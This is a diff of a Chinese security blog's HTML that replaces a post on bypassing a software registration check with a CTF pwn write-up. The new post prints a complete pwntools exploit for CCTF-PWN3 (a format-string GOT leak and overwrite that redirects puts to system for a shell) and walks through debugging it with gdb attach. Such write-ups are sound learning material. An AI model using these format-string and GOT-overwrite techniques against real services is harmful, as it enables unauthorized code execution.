@@ -15,24 +15,26 @@
 
 
 
-<meta name="description" content="第五个只能算得上是学习一个新技能–万能断点之前没听过。">
+<meta name="description" content="好久不跟，每次图片都要生成链接，emmm………说到底还是懒。还是该坚持。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="practice 5之万能断点">
-<meta property="og:url" content="http://xq.dropsec.xyz/2017/02/12/practice-5之万能断点/index.html">
+<meta property="og:title" content="gdb.attach跟exp">
+<meta property="og:url" content="http://xq.dropsec.xyz/2018/05/30/gdb-attach跟exp/index.html">
 <meta property="og:site_name" content="Mr_white">
-<meta property="og:description" content="第五个只能算得上是学习一个新技能–万能断点之前没听过。">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/h51.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/h52.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/h53.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/h54.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/h55.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/h56.png">
-<meta property="og:image" content="http://otc7tld02.bkt.clouddn.com/h57.png">
-<meta property="og:updated_time" content="2017-12-13T04:27:51.480Z">
+<meta property="og:description" content="好久不跟，每次图片都要生成链接，emmm………说到底还是懒。还是该坚持。">
+<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf4ine2ij30ek070mxk.jpg">
+<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf53q87lj30va05ajuq.jpg">
+<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf5fh3puj30d904kabc.jpg">
+<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frtf3b5r1zj30fe03fglp.jpg">
+<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf76cb21j307k020745.jpg">
+<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frtf7qr1gsj30hd06rdgd.jpg">
+<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frtf8usxsej30om04mgns.jpg">
+<meta property="og:image" content="http://wx1.sinaimg.cn/mw690/0060lm7Tly1frtf875w47j30fw0bpq79.jpg">
+<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf97rcc5j30d905c0t1.jpg">
+<meta property="og:updated_time" content="2018-05-30T07:59:36.575Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="practice 5之万能断点">
-<meta name="twitter:description" content="第五个只能算得上是学习一个新技能–万能断点之前没听过。">
-<meta name="twitter:image" content="http://otc7tld02.bkt.clouddn.com/h51.png">
+<meta name="twitter:title" content="gdb.attach跟exp">
+<meta name="twitter:description" content="好久不跟，每次图片都要生成链接，emmm………说到底还是懒。还是该坚持。">
+<meta name="twitter:image" content="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf4ine2ij30ek070mxk.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -64,7 +66,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>practice 5之万能断点 | Mr_white</title>
+<title>gdb.attach跟exp | Mr_white</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -291,11 +293,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-practice-5之万能断点" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-gdb-attach跟exp" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/02/12/practice-5之万能断点/" class="article-date">
-      <time datetime="2017-02-12T03:16:06.000Z" itemprop="datePublished">2017-02-12</time>
+      <a href="/2018/05/30/gdb-attach跟exp/" class="article-date">
+      <time datetime="2018-05-30T01:59:24.000Z" itemprop="datePublished">2018-05-30</time>
 </a>
 
 
@@ -310,7 +312,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      practice 5之万能断点
+      gdb.attach跟exp
     </h1>
   
 
@@ -319,13 +321,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/reverse-practice/">reverse practice</a>
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/debug/">debug</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -335,17 +337,111 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>第五个只能算得上是学习一个新技能–万能断点之前没听过。</p>
-<a id="more"></a>
-<p>给的是一个未注册版本的软件，题目要求将其注册<br><img src="http://otc7tld02.bkt.clouddn.com/h51.png" alt=""></p>
-<p>乱填只能是出错误<br><img src="http://otc7tld02.bkt.clouddn.com/h52.png" alt=""></p>
-<p>放入IDA用运行，然后点击输入注册码，报错之后暂停OD调试<br><img src="http://otc7tld02.bkt.clouddn.com/h53.png" alt=""></p>
-<p>如下图查看user3模块<br><img src="http://otc7tld02.bkt.clouddn.com/h54.png" alt=""></p>
-<p>转到这个模块下之后便开始下万能断点；查找二进制字符串（crtl+B）,然后在弹出的框内输入万能断点并将跳转处设为断点</p>
-<p><img src="http://otc7tld02.bkt.clouddn.com/h55.png" alt=""></p>
-<p>重新载入程序，依旧输入错误注册码（由于万能断点，在运行到弹出输入界面时，中途会多次暂停）输入结束之后便可以按F8单步步过。直到堆栈窗口出现正确的注册码<br><img src="http://otc7tld02.bkt.clouddn.com/h56.png" alt=""></p>
-<p>输入检验注册成功：<br><img src="http://otc7tld02.bkt.clouddn.com/h57.png" alt=""></p>
-<p>万能断点：“F3 A5 8B C8 83 E1 03 F3 A4 E8”</p>
+        <p>好久不跟，每次图片都要生成链接，emmm………说到底还是懒。还是该坚持。<br><a id="more"></a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学pwn之路上的一个必经之路就是debug，前几天看到一个格式化的题目，在安全课上有相关文章（<a href="https://www.anquanke.com/post/id/85785" target="_blank" rel="external">戳我</a>），对就是那个CCTF-PWN3，exp逻辑很简单，跟着bin看一下exp就能明白，但是始终EOF，无法成功getshell，还记得学长跟我们说过的：做pwn题关键就在于跟exp，了解是哪里利用不对。OK，那就学学如何attach。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先贴上自己做这题的exp,具体的利用逻辑可以到上面的那个文章里进行查看：</p>
+<pre><code>#!/usr/bin/env python
+from pwn import *
+
+context.log_level = &apos;debug&apos;
+
+elf = ELF(&apos;pwn3&apos;)
+libc = ELF(&apos;libc.so.6&apos;)
+
+pr = process(&apos;./pwn3&apos;) 
+#gdb.attach(pr, &apos;b *0x804889B&apos;)
+
+username = &quot;rxraclhm&quot;
+
+pr.recvuntil(&quot;Name (ftp.hacker.server:Rainism):&quot;)
+pr.sendline(username)
+
+# 1 -&gt; get
+# 2 -&gt; put
+# 3 -&gt; dir
+# other -&gt; exit
+
+def put(pr, name, content):
+    pr.recvuntil(&quot;ftp&gt;&quot;)
+    pr.sendline(&apos;put&apos;) 
+    pr.recvuntil(&quot;upload:&quot;)
+    pr.sendline(name)
+    pr.recvuntil(&quot;content:&quot;)
+    pr.sendline(content)
+
+def get(pr, name, num):
+    pr.recvuntil(&quot;ftp&gt;&quot;)
+    pr.sendline(&apos;get&apos;)
+    pr.recvuntil(&apos;get:&apos;)
+    pr.sendline(name)
+    return pr.recvn(num)
+
+def dir(pr):
+    pr.recvuntil(&quot;ftp&gt;&quot;)
+    pr.sendline(&apos;dir&apos;)
+
+plt_puts = elf.symbols[&apos;puts&apos;]
+print &apos;plt_puts= &apos; + hex(plt_puts)
+got_puts = elf.got[&apos;puts&apos;]
+print &apos;got_puts= &apos; + hex(got_puts)
+
+# /bin/sh
+pause()
+put(pr, &apos;/sh&apos;, &apos;%8$s&apos; + p32(got_puts))
+
+text = get(pr, &apos;/sh&apos;, 4)
+puts_addr = u32(text)
+print &apos;puts_addr= &apos; + hex(puts_addr)
+system_addr = puts_addr - (libc.symbols[&apos;puts&apos;] - libc.symbols[&apos;system&apos;])
+print &apos;system_addr= &apos; + hex(system_addr)
+
+def foo(name, address, num):
+    num = num &amp; 0xff
+    if num == 0 : num == 0x100
+    payload = &apos;%&apos; + str(num) + &apos;c%10$hhn&apos;
+    payload = payload.ljust(12, &apos;A&apos;) 
+    put(pr, name, payload + p32(address))
+    get(pr, name, 0)
+
+foo(&apos;n&apos;, got_puts, system_addr)
+foo(&apos;i&apos;, got_puts+1, (system_addr&gt;&gt;8)+6)
+foo(&apos;b&apos;, got_puts+2, system_addr&gt;&gt;16)
+foo(&apos;/&apos;, got_puts+3, system_addr&gt;&gt;24)
+
+#put(pr, &apos;/sh&apos;, &apos;%8$s&apos; + p32(got_puts))
+
+text = get(pr, &apos;/sh&apos;, 4)
+puts_addr = u32(text)
+print &apos;puts_addr= &apos; + hex(puts_addr)
+# system(&quot;/bin/sh&quot;)
+dir(pr)
+pr.interactive()
+</code></pre><p>我们直接本地执行是无法getshell的<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf4ine2ij30ek070mxk.jpg" alt=""></p>
+<p>那么到底什么地方出了问题呢，有了利用逻辑，可以根据自己的逻辑一个一个的排查：</p>
+<ol>
+<li>泄漏的system地址错误？</li>
+</ol>
+<p>这个题目第一步就是利用格式化字符串泄漏puts的真实地址然后根据libc的偏移计算出system的地址。那么会不会是libc出了错误呢？</p>
+<p>attach是时候表示一下了,这里其实可以直接在exp里调用attach，这里为了看的清楚，手动attach。在泄露位置下断点，然后在gdb中attach相关pid启动调试<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf53q87lj30va05ajuq.jpg" alt=""></p>
+<p>然后在gdb中需要在一个地方下断点使得程序进入相关位置进行观察，然后c到相关位置（这里需要在左边的DEBUG终端内触发一下才可以继续。）<br>然后在gdb中把puts地址打印出来，和泄漏的进行对比。嗯，这个可能排除。</p>
+<p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf5fh3puj30d904kabc.jpg" alt=""></p>
+<ol>
+<li>覆写出了问题？<br>泄漏出来地址之后就是构思如何执行system(/bin/sh)<br>看到dir函数里有一个puts函数，我们进行利用格式化字符把puts的地址进行覆写，在执行puts(/bin/sh),就变成了system(/bin/sh)</li>
+</ol>
+<p>这里会不会是覆写出了问题呢？可以看一看。直接在puts的调用地方下断点。</p>
+<p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frtf3b5r1zj30fe03fglp.jpg" alt=""> </p>
+<p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf76cb21j307k020745.jpg" alt=""></p>
+<p>直接c到相关位置:<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frtf7qr1gsj30hd06rdgd.jpg" alt=""></p>
+<p>可以看出来，参数/bin/sh已经成功写入，那么与puts绑定的got有没有成功改写呢？继续跟。s进入puts</p>
+<p>下图可以看出我们覆写的是没有问题的。额。。的确puts的got被我们改成了我们计算出来的system的地址了。</p>
+<p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frtf8usxsej30om04mgns.jpg" alt=""></p>
+<ol>
+<li>libc不匹配<br>那就奇怪了，为什么没有成功getshell呢？下图给你答案，libc不匹配，通过提供的libc的offset计算的system地址是不正确的。</li>
+</ol>
+<p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1frtf875w47j30fw0bpq79.jpg" alt=""></p>
+<p>这里我们看到c3和c9相差了6，那么我们将覆写system地址对应位置加上6即可覆写成功，即（foo(‘i’, got_puts+1, (system_addr&gt;&gt;8)+6)）或者是去找到对应的libc直接跑exp即可getshell。</p>
+<p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frtf97rcc5j30d905c0t1.jpg" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我曾请教过一个大佬，如何学习pwn，他给我的意见就是到XCTF社区把那些热门题目跟exp多熟悉即可。的确，用好资源,重在积累。</p>
 
       
     </div>
@@ -354,13 +450,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2017/02/12/practice-5之万能断点/">practice 5之万能断点</a></p>
+        <p><span>Title:</span><a href="/2018/05/30/gdb-attach跟exp/">gdb.attach跟exp</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage">Mr_white</a></p>
-        <p><span>Created:</span>2017-02-12, 11:16:06</p>
-        <p><span>Updated:</span>2017-12-13, 12:27:51</p>
+        <p><span>Created:</span>2018-05-30, 09:59:24</p>
+        <p><span>Updated:</span>2018-05-30, 15:59:36</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2017/02/12/practice-5之万能断点/" title="practice 5之万能断点">http://xq.dropsec.xyz/2017/02/12/practice-5之万能断点/</a>
-            <span class="copy-path" data-clipboard-text="From http://xq.dropsec.xyz/2017/02/12/practice-5之万能断点/　　By Mr_white" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2018/05/30/gdb-attach跟exp/" title="gdb.attach跟exp">http://xq.dropsec.xyz/2018/05/30/gdb-attach跟exp/</a>
+            <span class="copy-path" data-clipboard-text="From http://xq.dropsec.xyz/2018/05/30/gdb-attach跟exp/　　By Mr_white" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -372,16 +468,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/02/13/practice-6之算法夹杂/">
-                    practice 6之算法夹杂
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/02/12/practice-4之IDA用法/">
-                    practice-4之IDA用法
+                <a href="/2017/12/02/校赛Reverse-Crypto-writeup/">
+                    校赛Reverse&amp;Crypto writeup
                 </a>
             </div>
         
@@ -393,7 +483,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
         
     </div>
     <style>
@@ -435,15 +525,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/02/13/practice-6之算法夹杂/" title="Pre: practice 6之算法夹杂">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
         
 
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/02/12/practice-4之IDA用法/" title="Next: practice-4之IDA用法">
+            <a href="/2017/12/02/校赛Reverse-Crypto-writeup/" title="Next: 校赛Reverse&amp;Crypto writeup">
                 <i class="fa fa-angle-right"></i>
             </a>
         
